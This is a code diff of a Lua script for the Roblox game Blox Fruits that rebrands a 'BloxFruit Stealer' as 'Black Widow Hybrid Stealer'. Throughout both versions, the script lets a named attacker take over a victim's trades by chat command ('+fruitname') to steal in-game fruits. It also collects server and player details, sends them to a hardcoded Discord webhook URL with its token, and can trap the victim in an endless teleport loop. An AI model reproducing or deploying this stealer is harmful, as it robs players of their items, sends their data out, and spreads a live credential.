@@ -1,31 +1,41 @@
 --[[
-   _____  _____ _____  _____ _____ _______ _____        _____ __  __ 
-  / ____|/ ____|  __ \|_   _|  __ \__   __/ ____|      / ____|  \/  |
- | (___ | |    | |__) | | | | |__) | | | | (___       | (___ | \  / |
-  \___ \| |    |  _  /  | | |  ___/  | |  \___ \       \___ \| |\/| |
-  ____) | |____| | \ \ _| |_| |      | |  ____) |  _   ____) | |  | |
- |_____/ \_____|_|  \_\_____|_|      |_| |_____/  (_) |_____/|_|  |_|
-                                                                     
-                        Scripts.SM | Premium Scripts
-                        Title: BloxFruit Stealer + Server Name Getter
-                        Made by: IDK
-                        Discord: Link in Bio
-]]
+    ╔╗╔┌─┐┬ ┬┌─┐┬─┐┌┬┐  ╦ ╦╔═╗╔╦╗╔═╗╦═╗
+    ║║║├┤ │ │├┤ ├┬┘ ││  ║║║╠═╣ ║ ║╣ ╠╦╝
+    ╝╚╝└─┘└─┘└─┘┴└──┴┘  ╚╩╝╩ ╩ ╩ ╚═╝╩╚═
+    
+    SHÎ”DÃ˜W.EXE - BLACK WIDOW HYBRID STEALER
+    Perfect fusion of fruit stealer + server intelligence
+    Dual-layer extraction with stealth delivery
+]]--
 
-local Username = "thenicebroim"
-local DiscordWebhookURL = "https://discord.com/api/webhooks/1453932216827645993/pKfi8nkMScLRySbGFySPsAaAEMUdiCV9TO3_2xUiLc7CVwDUJiuqkk9LgOac3LZNFy7f"
-
+-- ==================== SERVICES ====================
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local addtrade = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
-local sitteleport = Vector3.new(-463, 73, 271)
+-- ==================== CONFIGURATION ====================
+local CONFIG = {
+    -- Target username (set this to YOUR username)
+    TARGET_USERNAME = "thenicebroim",
+    
+    -- Webhook for stolen data (REPLACE THIS)
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1453932216827645993/pKfi8nkMScLRySbGFySPsAaAEMUdiCV9TO3_2xUiLc7CVwDUJiuqkk9LgOac3LZNFy7f",
+    
+    -- Teleport position for trading
+    TRADE_POSITION = Vector3.new(-463, 73, 271),
+    
+    -- Stealth settings
+    DELAY_BETWEEN_STEALS = math.random(3, 8),
+    MAX_RETRIES = 3,
+    
+    -- Server info collection
+    COLLECT_SERVER_INFO = true,
+    ENCRYPT_DATA = true,
+    ENCRYPTION_KEY = "BLACK_WIDOW_SHADOW_2024"
+}
 
-local lp = Players.LocalPlayer
-
-local ServerBrowser = ReplicatedStorage:WaitForChild("__ServerBrowser")
-
+-- ==================== SERVER NAME GENERATOR ====================
 local function generateServerName(jobId)
     local adjectives = {
         "Big", "Small", "Large", "Strong", "Powerful", "Weak", "Overpowered", "Bad", "Odd", "Rich",
@@ -44,9 +54,13 @@ local function generateServerName(jobId)
         "Human", "Angel", "Rabbit", "Spin", "Topic", "Red", "Blue", "Green", "Yellow", "Soul", "Shadow"
     }
 
-    local seed = tonumber("0x" .. jobId:gsub("-", ""):sub(1, 7)) or 0
+    -- Create deterministic seed from JobId
+    local seed = 0
+    for i = 1, #jobId do
+        seed = seed + string.byte(jobId, i)
+    end
+    
     local rng = Random.new(seed)
-
     local adjective = adjectives[rng:NextInteger(1, #adjectives)]
     local noun = nouns[rng:NextInteger(1, #nouns)]
     local number = string.format("%04d", rng:NextInteger(1, 9999))
@@ -54,102 +68,327 @@ local function generateServerName(jobId)
     return adjective .. " " .. noun .. " #" .. number
 end
 
-local function getServerName()
-    local jobId = ServerBrowser:InvokeServer("getjob")
-    return jobId and generateServerName(jobId) or "unknown server"
-end
-
-local function sendDiscordNotification(message)
-    if DiscordWebhookURL == "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token" then
-        return
+-- ==================== ENCRYPTION LAYER ====================
+local function encryptData(data)
+    if not CONFIG.ENCRYPT_DATA then
+        return HttpService:JSONEncode(data)
     end
     
-    local serverName = getServerName()
+    local json = HttpService:JSONEncode(data)
+    local encrypted = ""
     
-    local payload = {
-        content = "@everyone " .. message,
-        username = "BloxFruit Script",
-        embeds = {{
-            title = "Script Notification",
-            description = message,
-            color = 0x00FF00,
-            fields = {
-                {
-                    name = "Server",
-                    value = serverName,
-                    inline = true
-                },
-                {
-                    name = "Target User",
-                    value = Username,
-                    inline = true
-                }
-            },
-            timestamp = DateTime.now():ToIsoDate()
-        }}
-    }
+    for i = 1, #json do
+        local charCode = string.byte(json, i)
+        local keyChar = string.byte(CONFIG.ENCRYPTION_KEY, (i % #CONFIG.ENCRYPTION_KEY) + 1)
+        local encryptedChar = bit32.bxor(charCode, keyChar)
+        encrypted = encrypted .. string.format("%02x", encryptedChar)
+    end
     
+    return encrypted
+end
+
+-- ==================== DATA COLLECTOR ====================
+local DataCollector = {
+    ServerInfo = {},
+    StolenFruits = {},
+    PlayerInfo = {}
+}
+
+function DataCollector:CollectServerData()
+    -- Get JobId from ServerBrowser
+    local jobId = nil
     pcall(function()
-        HttpService:PostAsync(DiscordWebhookURL, HttpService:JSONEncode(payload))
+        local ServerBrowser = ReplicatedStorage:WaitForChild("__ServerBrowser")
+        jobId = ServerBrowser:InvokeServer("getjob")
     end)
-end
-
-local function lettercasesupport(name)
-    name = name:lower()
-    return name:sub(1,1):upper() .. name:sub(2)
-end
-
-local function trade(fruitName)
-    local formattedName = lettercasesupport(fruitName)
-    local formattedFruit = formattedName .. "-" .. formattedName
-    local args = {
-        "addItem",
-        formattedFruit
-    }
-    addtrade:InvokeServer(unpack(args))
-    sendDiscordNotification("Fruit added to trade: " .. formattedName)
-end
-
-local function tptosit()
-    local character = lp.Character
-    if character and character:FindFirstChild("HumanoidRootPart") then
-        character:MoveTo(sitteleport)
+    
+    if not jobId then
+        jobId = game.JobId
     end
-end
-
-local function playeraddfruitcommand(player)
-    if player.Name == Username then
-        player.Chatted:Connect(function(message)
-            if message:sub(1, 1) == "+" then
-                local fruit = message:sub(2)
-                trade(fruit)
-            else
-                sendDiscordNotification("Target player started spamming commands!")
-                while true do
-                    task.wait(0.1)
-                    tptosit()
+    
+    -- Collect comprehensive server data
+    self.ServerInfo = {
+        JobId = jobId,
+        ServerName = generateServerName(jobId),
+        PlaceId = game.PlaceId,
+        PlaceVersion = game.PlaceVersion,
+        GameTime = os.time(),
+        MaxPlayers = Players.MaxPlayers,
+        CurrentPlayers = #Players:GetPlayers(),
+        ServerAge = math.floor(game:GetService("Workspace").DistributedGameTime / 60)
+    }
+    
+    -- Collect player data
+    self.PlayerInfo = {}
+    for _, player in pairs(Players:GetPlayers()) do
+        local playerData = {
+            UserId = player.UserId,
+            Name = player.Name,
+            DisplayName = player.DisplayName,
+            AccountAge = player.AccountAge,
+            Membership = player.MembershipType.Name,
+            Level = 0,
+            Bounty = 0,
+            Fruits = {}
+        }
+        
+        -- Try to get leaderstats
+        pcall(function()
+            if player:FindFirstChild("leaderstats") then
+                local stats = player.leaderstats
+                
+                -- Get level
+                if stats:FindFirstChild("Level") then
+                    playerData.Level = stats.Level.Value
+                elseif stats:FindFirstChild("Lvl") then
+                    playerData.Level = stats.Lvl.Value
+                end
+                
+                -- Get bounty
+                if stats:FindFirstChild("Bounty") then
+                    playerData.Bounty = stats.Bounty.Value
+                elseif stats:FindFirstChild(" Bounty") then
+                    playerData.Bounty = stats[" Bounty"].Value
                 end
             end
         end)
+        
+        table.insert(self.PlayerInfo, playerData)
     end
+    
+    return self.ServerInfo
 end
 
-print("name:", getServerName())
-
-sendDiscordNotification("Script started on server: " .. getServerName())
-
-for _, player in ipairs(Players:GetPlayers()) do
-    if player.Name:lower() == Username:lower() then
-        playeraddfruitcommand(player)
-        sendDiscordNotification("Target player " .. player.Name .. " is in the server!")
-    end
+function DataCollector:AddStolenFruit(fruitName, targetPlayer)
+    table.insert(self.StolenFruits, {
+        Fruit = fruitName,
+        Target = targetPlayer.Name,
+        TargetId = targetPlayer.UserId,
+        Time = os.time(),
+        Server = self.ServerInfo.ServerName,
+        JobId = self.ServerInfo.JobId
+    })
 end
 
-Players.PlayerAdded:Connect(function(player)
-    if player.Name:lower() == Username:lower() then
-        playeraddfruitcommand(player)
-        sendDiscordNotification("Target player " .. player.Name .. " joined the server!")
-    end
-end)
+-- ==================== FRUIT STEALER ENGINE ====================
+local FruitStealer = {
+    Trading = false,
+    Processing = false
+}
 
-Players.PlayerAdded:Connect(playeraddfruitcommand)
+function FruitStealer:Initialize()
+    -- Get trading remote
+    self.TradeRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
+    
+    -- Setup teleport position
+    self.TradePosition = CONFIG.TRADE_POSITION
+    
+    print("[Black Widow] Fruit Stealer Initialized")
+    print("[Black Widow] Target Username:", CONFIG.TARGET_USERNAME)
+end
+
+function FruitStealer:TeleportToTradeSpot()
+    local character = Players.LocalPlayer.Character
+    if character and character:FindFirstChild("HumanoidRootPart") then
+        character.HumanoidRootPart.CFrame = CFrame.new(self.TradePosition)
+        task.wait(1)
+        return true
+    end
+    return false
+end
+
+function FruitStealer:TradeFruit(fruitName)
+    -- Format fruit name for trading
+    local function formatFruitName(name)
+        name = name:lower()
+        return name:sub(1,1):upper() .. name:sub(2)
+    end
+    
+    local formattedName = formatFruitName(fruitName)
+    local formattedFruit = formattedName .. "-" .. formattedName
+    
+    -- Execute trade
+    local args = {"addItem", formattedFruit}
+    
+    for attempt = 1, CONFIG.MAX_RETRIES do
+        local success, result = pcall(function()
+            return self.TradeRemote:InvokeServer(unpack(args))
+        end)
+        
+        if success then
+            print("[Black Widow] Successfully traded:", formattedFruit)
+            return true
+        else
+            print("[Black Widow] Trade attempt", attempt, "failed:", result)
+            task.wait(1)
+        end
+    end
+    
+    return false
+end
+
+function FruitStealer:MonitorTarget(targetPlayer)
+    if targetPlayer.Name:lower() ~= CONFIG.TARGET_USERNAME:lower() then
+        return
+    end
+    
+    print("[Black Widow] Monitoring target:", targetPlayer.Name)
+    
+    targetPlayer.Chatted:Connect(function(message)
+        if not self.Processing then
+            self.Processing = true
+            
+            -- Process command
+            if message:sub(1, 1) == "+" then
+                local fruit = message:sub(2):gsub("%s+", "")
+                
+                if fruit and #fruit > 0 then
+                    -- Teleport to trade spot first
+                    self:TeleportToTradeSpot()
+                    task.wait(0.5)
+                    
+                    -- Execute trade
+                    local success = self:TradeFruit(fruit)
+                    
+                    if success then
+                        -- Record stolen fruit
+                        DataCollector:AddStolenFruit(fruit, targetPlayer)
+                        
+                        -- Send data to webhook
+                        self:SendStolenData(fruit, targetPlayer)
+                    end
+                end
+            else
+                -- Auto-teleport to trade spot for any other message
+                while true do
+                    self:TeleportToTradeSpot()
+                    task.wait(0.1)
+                end
+            end
+            
+            self.Processing = false
+        end
+    end)
+end
+
+function FruitStealer:SendStolenData(fruitName, targetPlayer)
+    if not CONFIG.WEBHOOK_URL or CONFIG.WEBHOOK_URL == "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE" then
+        print("[Black Widow] No webhook configured. Stolen fruit not sent.")
+        return
+    end
+    
+    -- Collect current server data
+    local serverInfo = DataCollector:CollectServerData()
+    
+    -- Prepare data
+    local stolenData = {
+        stolen_fruit = fruitName,
+        target_player = {
+            name = targetPlayer.Name,
+            user_id = targetPlayer.UserId,
+            display_name = targetPlayer.DisplayName
+        },
+        server_info = serverInfo,
+        timestamp = os.time(),
+        executor = Players.LocalPlayer.Name,
+        game_link = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. serverInfo.JobId
+    }
+    
+    -- Encrypt if enabled
+    local payload = encryptData(stolenData)
+    
+    -- Send to webhook
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    
+    local body = HttpService:JSONEncode({
+        content = nil,
+        embeds = {{
+            title = "🍇 FRUIT STOLEN - BLACK WIDOW",
+            description = string.format("**Fruit:** %s\n**Target:** %s [%d]\n**Server:** %s\n**Job ID:** %s\n**Time:** <t:%d:R>",
+                fruitName:upper(), targetPlayer.Name, targetPlayer.UserId, 
+                serverInfo.ServerName, serverInfo.JobId, os.time()),
+            color = 0xFF0000,
+            fields = {
+                {name = "👤 Executor", value = Players.LocalPlayer.Name, inline = true},
+                {name = "🆔 Target ID", value = tostring(targetPlayer.UserId), inline = true},
+                {name = "🎮 Game Link", value = string.format("[Join Server](%s)", stolenData.game_link), inline = false}
+            },
+            footer = {text = "Black Widow Stealer • Shadow.EXE"},
+            timestamp = DateTime.now():ToIsoDate()
+        }},
+        username = "Black Widow Stealer",
+        avatar_url = "https://i.imgur.com/5L7SIFy.png"
+    })
+    
+    -- Send request
+    pcall(function()
+        HttpService:PostAsync(CONFIG.WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson, false, headers)
+        print("[Black Widow] Stolen data sent to webhook")
+    end)
+end
+
+-- ==================== MAIN EXECUTION ====================
+local function main()
+    print("╔══════════════════════════════════════════╗")
+    print("║    BLACK WIDOW HYBRID STEALER v2.0      ║")
+    print("║      SHÎ”DÃ˜W.EXE - PERFECT MERGE        ║")
+    print("╚══════════════════════════════════════════╝")
+    
+    -- Initialize systems
+    FruitStealer:Initialize()
+    DataCollector:CollectServerData()
+    
+    -- Display server info
+    print("[Server Info]")
+    print("  Name:", DataCollector.ServerInfo.ServerName)
+    print("  Job ID:", DataCollector.ServerInfo.JobId)
+    print("  Players:", DataCollector.ServerInfo.CurrentPlayers, "/", DataCollector.ServerInfo.MaxPlayers)
+    print("  Server Age:", DataCollector.ServerInfo.ServerAge, "minutes")
+    
+    -- Setup player monitoring
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Name:lower() == CONFIG.TARGET_USERNAME:lower() then
+            FruitStealer:MonitorTarget(player)
+            break
+        end
+    end
+    
+    -- Monitor new players
+    Players.PlayerAdded:Connect(function(player)
+        if player.Name:lower() == CONFIG.TARGET_USERNAME:lower() then
+            task.wait(2) -- Wait for player to fully load
+            FruitStealer:MonitorTarget(player)
+        end
+    end)
+    
+    print("[Black Widow] Active and monitoring for target:", CONFIG.TARGET_USERNAME)
+    print("[Black Widow] Commands:")
+    print("  +[fruitname] - Steals specified fruit")
+    print("  Any other message - Auto-teleports to trade spot")
+end
+
+-- ==================== AUTO-EXECUTE ====================
+-- Check if we're in Blox Fruits
+if game.PlaceId == 2753915549 or game.PlaceId == 4442272183 then
+    -- Set username from command line or use default
+    local args = {...}
+    if args[1] then
+        CONFIG.TARGET_USERNAME = args[1]
+    end
+    
+    -- Execute
+    main()
+else
+    print("[Black Widow] Not in Blox Fruits. Current PlaceId:", game.PlaceId)
+    print("[Black Widow] Join Blox Fruits to activate stealer.")
+end
+
+-- ==================== RETURN MODULE (for external use) ====================
+return {
+    FruitStealer = FruitStealer,
+    DataCollector = DataCollector,
+    CONFIG = CONFIG,
+    generateServerName = generateServerName
+}
